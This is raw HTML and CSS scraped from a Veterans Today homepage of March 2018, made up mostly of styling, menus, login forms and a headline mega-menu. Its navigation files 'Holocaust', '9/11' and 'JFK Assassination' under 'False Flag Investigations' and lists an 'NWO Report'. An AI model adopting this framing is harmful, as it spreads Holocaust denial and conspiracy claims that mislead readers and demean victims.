    .td-theme-wrap .td-aj-search-results .td_module_wrap:hover .entry-title a,
    .td-theme-wrap .header-search-wrap .result-msg a:hover {
        color: #990000 !important;
    }

    
    .td-menu-background:before,
    .td-search-background:before {
        background: #333145;
        background: -moz-linear-gradient(top, #333145 0%, #990000 100%);
        background: -webkit-gradient(left top, left bottom, color-stop(0%, #333145), color-stop(100%, #990000));
        background: -webkit-linear-gradient(top, #333145 0%, #990000 100%);
        background: -o-linear-gradient(top, #333145 0%, @mobileu_gradient_two_mob 100%);
        background: -ms-linear-gradient(top, #333145 0%, #990000 100%);
        background: linear-gradient(to bottom, #333145 0%, #990000 100%);
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#333145', endColorstr='#990000', GradientType=0 );
    }

    
    .td-mobile-content .current-menu-item > a,
    .td-mobile-content .current-menu-ancestor > a,
    .td-mobile-content .current-category-ancestor > a,
    #td-mobile-nav .td-menu-login-section a:hover,
    #td-mobile-nav .td-register-section a:hover,
    #td-mobile-nav .td-menu-socials-wrap a:hover i,
    .td-search-close a:hover i {
        color: #990000;
    }

    
    .td-footer-wrapper,
    .td-footer-wrapper .td_block_template_7 .td-block-title > *,
    .td-footer-wrapper .td_block_template_17 .td-block-title,
    .td-footer-wrapper .td-block-title-wrap .td-wrapper-pulldown-filter {
        background-color: #232323;
    }

    
    .td-footer-wrapper::before {
        background-size: cover;
    }

    
    .td-footer-wrapper::before {
        background-position: center center;
    }

    
    .td-footer-wrapper::before {
        opacity: 0.1;
    }



    
    .post blockquote p,
    .page blockquote p,
    .td-post-text-content blockquote p {
        font-size:15px;
	line-height:21px;
	font-weight:bold;
	
    }
    
    .post .td_quote_box p,
    .page .td_quote_box p {
        font-size:15px;
	
    }
    
    .td-post-template-default .td-post-sub-title,
    .td-post-template-1 .td-post-sub-title,
    .td-post-template-4 .td-post-sub-title,
    .td-post-template-5 .td-post-sub-title,
    .td-post-template-9 .td-post-sub-title,
    .td-post-template-10 .td-post-sub-title,
    .td-post-template-11 .td-post-sub-title {
        font-size:17px;
	font-style:normal;
	
    }
</style>
<noscript><style type="text/css"> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><body class="home page-template-default page page-id-466622 ctct-Newspaper global-block-template-1 wpb-js-composer js-comp-ver-5.4.5 vc_responsive td-animation-stack-type0 td-full-layout" itemscope="itemscope" itemtype="https://schema.org/WebPage">
<div class="td-scroll-up"><i class="td-icon-menu-up"></i></div>
<div class="td-menu-background"></div>
<div id="td-mobile-nav">
<div class="td-mobile-container">

<div class="td-menu-socials-wrap">

<div class="td-menu-socials">
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.facebook.com/Veterans-Today-Network-170917822620" title="Facebook">
<i class="td-icon-font td-icon-facebook"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://plus.google.com/u/0/+Veteranstodaynetwork" title="Google+">
<i class="td-icon-font td-icon-googleplus"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="/cdn-cgi/l/email-protection#4635333636293432063023322334272835322922273f2823323129342d6825292b" title="Mail">
<i class="td-icon-font td-icon-mail-1"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.veteranstoday.com/feed/" title="RSS">
<i class="td-icon-font td-icon-rss"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://soundcloud.com/veteranstoday" title="Soundcloud">
<i class="td-icon-font td-icon-soundcloud"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.twitter.com/veteranstoday" title="Twitter">
<i class="td-icon-font td-icon-twitter"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.youtube.com/channel/UC2Vba5-IAh9kxID8ExsikFw" title="Youtube">
<i class="td-icon-font td-icon-youtube"></i>
</a>
</span> </div>

<div class="td-mobile-close">
<a href="#"><i class="td-icon-close-mobile"></i></a>
</div>
</div>

<div class="td-menu-login-section">
<div class="td-guest-wrap">
<div class="td-menu-avatar"><div class="td-avatar-container"></div></div>
<div class="td-menu-login"><a id="login-link-mob">Sign in</a> <span></span><a id="register-link-mob">Join</a></div>
</div>
</div>

<div class="td-mobile-content">
<div class="menu-header-2018-menu-container"><ul id="menu-header-2018-menu" class="td-mobile-main-menu"><li id="menu-item-464557" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-first menu-item-has-children menu-item-464557"><a href="https://www.veteranstoday.com/category/government-and-politics/">Government<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li id="menu-item-0" class="menu-item-0"><a href="https://www.veteranstoday.com/category/government-and-politics/freedom-liberty/">Civil Liberties</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/government-and-politics/corruption/">Corruption</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/government-and-politics/elections/">Democracy</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/government-and-politics/foreign-relations/">Foreign Policy</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/government-and-politics/legislation/">Legislation</a></li>
</ul>
</li>
<li id="menu-item-464558" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-464558"><a href="https://www.veteranstoday.com/category/false-flag-investigations/">Investigations<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/false-flag-investigations/911-and-terror-war/">9/11</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/false-flag-investigations/holocaust-false-flags/">Holocaust</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/false-flag-investigations/jfk/">JFK Assassination</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/false-flag-investigations/paris-attacks-2015/">Paris Attacks 2015</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/false-flag-investigations/gordon-duff-files/">The Gordon Duff Files</a></li>
</ul>
</li>
<li id="menu-item-467379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-467379"><a href="https://www.veteranstoday.com/category/life/">Life<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/art-music-entertainment/">A &amp; E</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/peace/">Activism</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/education-economy/">Education</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/environment-of-interest-family/">Environment</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/family/">Family</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/food-wine-travel/">Food, Wine &amp; Travel</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/medical-and-health/">Health</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/medical-and-health/ptsd-and-coping/">Coping</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/medical-and-health/post-traumatic-stress-disorder-ptsd/">PTSD</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/money/">Money</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/new-world-order/">NWO Report</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/life/religion-faith/">Religion &amp; Philosophy</a></li>
</ul>
</li>
<li id="menu-item-466628" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-466628"><a href="https://www.veteranstoday.com/category/armed-forces/">Military</a></li>
<li id="menu-item-464560" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-464560"><a href="https://www.veteranstoday.com/category/news/">Veterans<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/news/heroes/">Heroes</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/news/veterans-organizations/">Veteran Service Organizations &amp; Charities</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/news/veterans-administration/">Veterans Administration (VA)</a></li>
</ul>
</li>
<li id="menu-item-464561" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-464561"><a href="https://www.veteranstoday.com/category/vt-radio/">VT Radio<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/vt-radio/false-flag-weekly-news/">False Flag Weekly News</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/vt-radio/punishradio/">PunishRadio</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/vt-radio/rag-radio/">Rag Radio</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/vt-radio/speaking-truth-to-empire/">Speaking Truth To Empire</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/vt-radio/trad-cat-knight-radio/">Trad Cat Knight Radio</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/vt-radio/truth-jihad/">Truth Jihad</a></li>
</ul>
</li>
<li id="menu-item-464563" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-464563"><a href="https://www.veteranstoday.com/category/wars/">WarZone<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/wars/afghanistan-and-pakistan/">Afghanistan War</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/wars/new-world-order-war/">New World Order (NWO)</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/wars/ukraine-wars/">Ukraine Wars</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/wars/syria-war/">War in Syria</a></li>
</ul>
</li>
<li id="menu-item-464562" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-464562"><a href="https://www.veteranstoday.com/category/world-global/">World<i class="td-icon-menu-right td-element-after"></i></a>
<ul class="sub-menu">
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/world-global/africa-world-global/">Africa</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/world-global/americas/">Americas</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/world-global/asia-world-global/">Asia</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/world-global/europe-world-global/">Europe</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/world-global/middle-east-issues/">Middle East</a></li>
<li class="menu-item-0"><a href="https://www.veteranstoday.com/category/world-global/russia-world-global/">Russia</a></li>
</ul>
</li>
</ul></div> </div>
</div>

<div id="login-form-mobile" class="td-register-section">
<div id="td-login-mob" class="td-login-animation td-login-hide-mob">

<div class="td-login-close">
<a href="#" class="td-back-button"><i class="td-icon-read-down"></i></a>
<div class="td-login-title">Sign in</div>

<div class="td-mobile-close">
<a href="#"><i class="td-icon-close-mobile"></i></a>
</div>
</div>
<div class="td-login-form-wrap">
<div class="td-login-panel-title"><span>Welcome!</span>Log into your account</div>
<div class="td_display_err"></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="login_email" id="login_email-mob" value="" required><label>your username</label></div>
<div class="td-login-inputs"><input class="td-login-input" type="password" name="login_pass" id="login_pass-mob" value="" required><label>your password</label></div>
<input type="button" name="login_button" id="login_button-mob" class="td-login-button" value="LOG IN">
<div class="td-login-info-text"><a href="#" id="forgot-pass-link-mob">Forgot your password?</a></div>
</div>
</div>
<div id="td-register-mob" class="td-login-animation td-login-hide-mob">

<div class="td-register-close">
<a href="#" class="td-back-button"><i class="td-icon-read-down"></i></a>
<div class="td-login-title">Sign up</div>

<div class="td-mobile-close">
<a href="#"><i class="td-icon-close-mobile"></i></a>
</div>
</div>
<div class="td-login-panel-title"><span>Welcome!</span>Register for an account</div>
<div class="td-login-form-wrap">
<div class="td_display_err"></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="register_email" id="register_email-mob" value="" required><label>your email</label></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="register_user" id="register_user-mob" value="" required><label>your username</label></div>
<input type="button" name="register_button" id="register_button-mob" class="td-login-button" value="REGISTER">
<div class="td-login-info-text">A password will be e-mailed to you.</div>
</div>
 </div>
<div id="td-forgot-pass-mob" class="td-login-animation td-login-hide-mob">

<div class="td-forgot-pass-close">
<a href="#" class="td-back-button"><i class="td-icon-read-down"></i></a>
<div class="td-login-title">Password recovery</div>
</div>
<div class="td-login-form-wrap">
<div class="td-login-panel-title">Recover your password</div>
<div class="td_display_err"></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="forgot_email" id="forgot_email-mob" value="" required><label>your email</label></div>
<input type="button" name="forgot_button" id="forgot_button-mob" class="td-login-button" value="Send My Pass">
</div>
</div>
</div>
</div> <div class="td-search-background"></div>
<div class="td-search-wrap-mob">
<div class="td-drop-down-search" aria-labelledby="td-header-search-button">
<form method="get" class="td-search-form" action="https://www.veteranstoday.com/">

<div class="td-search-close">
<a href="#"><i class="td-icon-close-mobile"></i></a>
</div>
<div role="search" class="td-search-input">
<span>Search</span>
<input id="td-header-search-mob" type="text" value="" name="s" autocomplete="off" />
</div>
</form>
<div id="td-aj-search-mob"></div>
</div>
</div>
<div id="td-outer-wrap" class="td-theme-wrap">

<div class="td-header-wrap td-header-style-1 ">
<div class="td-header-top-menu-full td-container-wrap ">
<div class="td-container td-header-row td-header-top-menu">
<div class="top-bar-style-1">
<div class="td-header-sp-top-menu">
<div class="td_data_time">
<div style="visibility:hidden;">
Monday, March 19, 2018
</div>
</div>
<ul class="top-header-menu td_ul_login"><li class="menu-item"><a class="td-login-modal-js menu-item" href="#login-form" data-effect="mpf-td-login-effect">Sign in / Join</a><span class="td-sp-ico-login td_sp_login_ico_style"></span></li></ul><div class="menu-top-container"><ul id="menu-network-menu" class="top-header-menu"><li id="menu-item-467534" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-first td-menu-item td-normal-menu menu-item-467534"><a href="https://www.veteranstoday.com/contact/">Resources</a>
<ul class="sub-menu">
<li id="menu-item-470897" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-470897"><a href="https://www.veteranstodayjobs.com/career-center-employment/" target="_blank" rel="nofollow">Job Center</a></li>
<li id="menu-item-467538" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-467538"><a href="https://www.veteranstoday.com/pollsarchive/">Polls</a></li>
<li id="menu-item-467537" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-467537"><a href="https://www.veteranstoday.com/custom-weapons/">Custom Weapons</a></li>
<li id="menu-item-400961" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400961"><a href="https://vtradio.airtime.pro/" target="_blank" rel="nofollow">VT Radio</a></li>
</ul>
</li>
<li id="menu-item-362182" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children td-menu-item td-normal-menu menu-item-362182"><a title="Download Android and IPhone VT Apps for Free" href="https://www.veteranstoday.com/apps/">Apps</a>
<ul class="sub-menu">
<li id="menu-item-400963" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400963"><a href="https://play.google.com/store/apps/details?id=com.optime.veterantoday" target="_blank">VT APP (Android)</a></li>
<li id="menu-item-400964" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400964"><a href="https://itunes.apple.com/us/app/veterans-today-network/id1016778550?mt=8" target="_blank" rel="nofollow">VT App (Iphone)</a></li>
</ul>
</li>
<li id="menu-item-465971" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-465971"><a href="https://www.zazzle.com/veteranstodaynetwork" target="_blank">Store</a></li>
<li id="menu-item-400983" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400983"><a href="http://visitor.r20.constantcontact.com/d.jsp?llr=6pxle4bab&#038;p=oi&#038;m=1101630135805&#038;sit=tc7usvicb&#038;f=f7780006-9f66-4b6e-ad5b-e7700b11ac27" target="_blank" rel="nofollow">Newsletter</a></li>
<li id="menu-item-467533" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children td-menu-item td-normal-menu menu-item-467533"><a href="https://www.veteranstoday.com/contact/">Contact</a>
<ul class="sub-menu">
<li id="menu-item-360535" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-360535"><a title="Subit Support Ticket to our Help Desk &#8211; 24 hour service" href="https://veterans.zendesk.com/hc/en-us/requests/new" target="_blank" rel="nofollow">Submit Support Ticket</a></li>
<li id="menu-item-360534" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-360534"><a title="Search Our Database for Answer to Common Questions" href="https://veterans.zendesk.com/hc/en-us" target="_blank" rel="nofollow">Help Desk</a></li>
<li id="menu-item-464555" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-464555"><a href="https://www.veteranstoday.com/editorial-board/">Board &#038; Staff</a></li>
<li id="menu-item-465188" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-465188"><a href="https://www.veteranstoday.com/editorial-board/speakers-bureau/">Speakers Bureau</a></li>
<li id="menu-item-465163" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-465163"><a href="https://www.veteranstoday.com/editorial-board/media-partners/">Media Partners</a></li>
</ul>
</li>
<li id="menu-item-476712" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-476712"><a href="https://www.veteranstodaynetwork.com/contact/privacy-policy/" target="_blank" rel="nofollow">Privacy Policy</a></li>
</ul></div></div>
<div class="td-header-sp-top-widget">
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.facebook.com/Veterans-Today-Network-170917822620" title="Facebook">
<i class="td-icon-font td-icon-facebook"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://plus.google.com/u/0/+Veteranstodaynetwork" title="Google+">
<i class="td-icon-font td-icon-googleplus"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="/cdn-cgi/l/email-protection#becdcbceced1cccafec8dbcadbccdfd0cdcad1dadfc7d0dbcac9d1ccd590ddd1d3" title="Mail">
<i class="td-icon-font td-icon-mail-1"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.veteranstoday.com/feed/" title="RSS">
<i class="td-icon-font td-icon-rss"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://soundcloud.com/veteranstoday" title="Soundcloud">
<i class="td-icon-font td-icon-soundcloud"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.twitter.com/veteranstoday" title="Twitter">
<i class="td-icon-font td-icon-twitter"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.youtube.com/channel/UC2Vba5-IAh9kxID8ExsikFw" title="Youtube">
<i class="td-icon-font td-icon-youtube"></i>
</a>
</span> </div> </div>

<div id="login-form" class="white-popup-block mfp-hide mfp-with-anim">
<div class="td-login-wrap">
<a href="#" class="td-back-button"><i class="td-icon-modal-back"></i></a>
<div id="td-login-div" class="td-login-form-div td-display-block">
<div class="td-login-panel-title">Sign in</div>
<div class="td-login-panel-descr">Welcome! Log into your account</div>
<div class="td_display_err"></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="login_email" id="login_email" value="" required><label>your username</label></div>
<div class="td-login-inputs"><input class="td-login-input" type="password" name="login_pass" id="login_pass" value="" required><label>your password</label></div>
<input type="button" name="login_button" id="login_button" class="wpb_button btn td-login-button" value="Login">
<div class="td-login-info-text"><a href="#" id="forgot-pass-link">Forgot your password? Get help</a></div>
<a id="register-link">Create an account</a>
</div>
<div id="td-register-div" class="td-login-form-div td-display-none">
<div class="td-login-panel-title">Create an account</div>
<div class="td-login-panel-descr">Welcome! Register for an account</div>
<div class="td_display_err"></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="register_email" id="register_email" value="" required><label>your email</label></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="register_user" id="register_user" value="" required><label>your username</label></div>
<input type="button" name="register_button" id="register_button" class="wpb_button btn td-login-button" value="Register">
<div class="td-login-info-text">A password will be e-mailed to you.</div>
</div>
<div id="td-forgot-pass-div" class="td-login-form-div td-display-none">
<div class="td-login-panel-title">Password recovery</div>
<div class="td-login-panel-descr">Recover your password</div>
<div class="td_display_err"></div>
<div class="td-login-inputs"><input class="td-login-input" type="text" name="forgot_email" id="forgot_email" value="" required><label>your email</label></div>
<input type="button" name="forgot_button" id="forgot_button" class="wpb_button btn td-login-button" value="Send My Password">
<div class="td-login-info-text">A password will be e-mailed to you.</div>
</div>
</div>
</div>
</div>
</div>
<div class="td-banner-wrap-full td-logo-wrap-full td-container-wrap ">
<div class="td-container td-header-row td-header-header">
<div class="td-header-sp-logo">
<h1 class="td-logo"> <a class="td-main-logo" href="https://www.veteranstoday.com/">
<img class="td-retina-data" data-retina="https://www.veteranstoday.com/wp-content/uploads/2017/10/544-vt-retina.jpg" src="https://www.veteranstoday.com/wp-content/uploads/2017/10/272-vt.jpg" alt="Veterans Today" title="Alternative Media for U.S. Veterans" />
<span class="td-visual-hidden">Veterans Today</span>
</a>
</h1> </div>
<div class="td-header-sp-recs">
<div class="td-header-rec-wrap">
<div class="td-a-rec td-a-rec-id-header  td-rec-hide-on-p td_uid_1_5aaf778c0c0db_rand td_block_template_1">
<div id='div-gpt-ad-1515201190893-0'>
<script data-cfasync="false" src="/cdn-cgi/scripts/d07b1474/cloudflare-static/email-decode.min.js"></script><script>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1515201190893-0'); });
</script>
</div>
</div>
</div> </div>
</div>
</div>
<div class="td-header-menu-wrap-full td-container-wrap ">
<div class="td-header-menu-wrap td-header-gradient ">
<div class="td-container td-header-row td-header-main-menu">
<div id="td-header-menu" role="navigation">
<div id="td-top-mobile-toggle"><a href="#"><i class="td-icon-font td-icon-mobile"></i></a></div>
<div class="td-main-menu-logo td-logo-in-header">
<a class="td-mobile-logo td-sticky-header" href="https://www.veteranstoday.com/">
<img class="td-retina-data" data-retina="https://www.veteranstoday.com/wp-content/uploads/2017/10/280VTmobile.jpg" src="https://www.veteranstoday.com/wp-content/uploads/2017/10/140VTmobile.jpg" alt="Veterans Today" title="Alternative Media for U.S. Veterans" />
</a>
<a class="td-header-logo td-sticky-header" href="https://www.veteranstoday.com/">
<img class="td-retina-data" data-retina="https://www.veteranstoday.com/wp-content/uploads/2017/10/544-vt-retina.jpg" src="https://www.veteranstoday.com/wp-content/uploads/2017/10/272-vt.jpg" alt="Veterans Today" title="Alternative Media for U.S. Veterans" />
</a>
</div>
<div class="menu-header-2018-menu-container"><ul id="menu-header-2018-menu-1" class="sf-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-first td-menu-item td-mega-menu menu-item-464557"><a href="https://www.veteranstoday.com/category/government-and-politics/">Government</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_2_5aaf778c0f959_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_2_5aaf778c0f959"><script>var block_td_uid_2_5aaf778c0f959 = new tdBlock();
block_td_uid_2_5aaf778c0f959.id = "td_uid_2_5aaf778c0f959";
block_td_uid_2_5aaf778c0f959.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"16","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_2_5aaf778c0f959_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_2_5aaf778c0f959_rand","tdc_css_class_style":"td_uid_2_5aaf778c0f959_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_2_5aaf778c0f959.td_column_number = "3";
block_td_uid_2_5aaf778c0f959.block_type = "td_block_mega_menu";
block_td_uid_2_5aaf778c0f959.post_count = "4";
block_td_uid_2_5aaf778c0f959.found_posts = "3140";
block_td_uid_2_5aaf778c0f959.header_color = "";
block_td_uid_2_5aaf778c0f959.ajax_pagination_infinite_stop = "";
block_td_uid_2_5aaf778c0f959.max_num_pages = "785";
tdBlocksArray.push(block_td_uid_2_5aaf778c0f959);
</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_2_5aaf778c0f959" id="td_uid_3_5aaf778c10adb" data-td_block_id="td_uid_2_5aaf778c0f959" data-td_filter_value="" href="https://www.veteranstoday.com/category/government-and-politics/">All</a><a class="mega-menu-sub-cat-td_uid_2_5aaf778c0f959" id="td_uid_4_5aaf778c10b68" data-td_block_id="td_uid_2_5aaf778c0f959" data-td_filter_value="14881" href="https://www.veteranstoday.com/category/government-and-politics/freedom-liberty/">Civil Liberties</a><a class="mega-menu-sub-cat-td_uid_2_5aaf778c0f959" id="td_uid_5_5aaf778c10c04" data-td_block_id="td_uid_2_5aaf778c0f959" data-td_filter_value="3378" href="https://www.veteranstoday.com/category/government-and-politics/corruption/">Corruption</a><a class="mega-menu-sub-cat-td_uid_2_5aaf778c0f959" id="td_uid_6_5aaf778c10c9c" data-td_block_id="td_uid_2_5aaf778c0f959" data-td_filter_value="39080" href="https://www.veteranstoday.com/category/government-and-politics/elections/">Democracy</a><a class="mega-menu-sub-cat-td_uid_2_5aaf778c0f959" id="td_uid_7_5aaf778c10d3a" data-td_block_id="td_uid_2_5aaf778c0f959" data-td_filter_value="191" href="https://www.veteranstoday.com/category/government-and-politics/foreign-relations/">Foreign Policy</a><a class="mega-menu-sub-cat-td_uid_2_5aaf778c0f959" id="td_uid_8_5aaf778c10dd0" data-td_block_id="td_uid_2_5aaf778c0f959" data-td_filter_value="9" href="https://www.veteranstoday.com/category/government-and-politics/legislation/">Legislation</a></div></div><div id=td_uid_2_5aaf778c0f959 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/19/terrorist-capabilities-laid-bare-in-an-eastern-ghouta-chemical-lab/" rel="bookmark" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-2-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-2-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-2-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab" /></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/corruption/" class="td-post-category">Corruption</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/19/terrorist-capabilities-laid-bare-in-an-eastern-ghouta-chemical-lab/" rel="bookmark" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab">Terrorist capabilities laid bare in an Eastern Ghouta chemical lab</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/trump-nominees-mike-pompeo-gina-haspel-signal-return-to-medieval-bush-days/" rel="bookmark" title="Trump nominees Mike Pompeo &#038; Gina Haspel signal return to medieval Bush days"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-1-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-1-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-1-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Trump nominees Mike Pompeo &#038; Gina Haspel signal return to medieval Bush days" /></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/" class="td-post-category">Government</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/trump-nominees-mike-pompeo-gina-haspel-signal-return-to-medieval-bush-days/" rel="bookmark" title="Trump nominees Mike Pompeo &#038; Gina Haspel signal return to medieval Bush days">Trump nominees Mike Pompeo &#038; Gina Haspel signal return to medieval&#8230;</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
